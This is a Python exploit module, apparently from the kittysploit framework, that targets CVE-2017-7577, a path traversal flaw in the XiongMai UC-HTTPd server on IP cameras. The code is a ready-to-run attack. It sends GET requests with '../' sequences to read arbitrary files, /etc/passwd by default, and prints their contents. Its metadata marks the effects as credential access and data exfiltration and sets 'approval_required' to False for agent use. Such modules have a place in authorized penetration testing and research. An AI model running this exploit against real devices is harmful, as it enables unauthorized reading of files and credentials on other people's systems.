#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""XiongMai UC-HTTPd Path Traversal"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'XiongMai UC-HTTPd Path Traversal',
        'description': 'Module exploits UC-HTTPd Path Traversal vulnerability in multiple XiongMai cameras. If target is vulnerable it is possible to list directories and read files from the file system.',
        'author': ['keksec', 'GH0st3rs'],
        'cve': ['CVE-2017-7577'],
        'platform': Platform.LINUX,
        'references': ['https://packetstormsecurity.com/files/142131/uc-httpd-directory-traversal.txt', 'https://www.cvedetails.com/cve/CVE-2017-7577/'],
        'tags': ['iot', 'camera', 'lfi', 'unauth', 'cve-2017-7577', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")
    filename = OptString("/etc/passwd", "File to read from filesystem")

    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            path = "/../../../../..{}".format(self.filename)
            response = self.http_request(
                method="GET",
                path=path
            )

            if response is None:
                print_error("Exploit failed - could not read response")
                return

            print_status("Reading file: {}".format(self.filename))

            if response.text:
                print_info(response.text)
            else:
                print_status("File seems to be empty")
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        path = "/../../../../../etc/passwd"
        response = self.http_request(
            method="GET",
            path=path
        )

        if response and ("/etc/passwd" in (response.text or '')):
            return True  # target is vulnerable

        return False  # target is not vulnerable
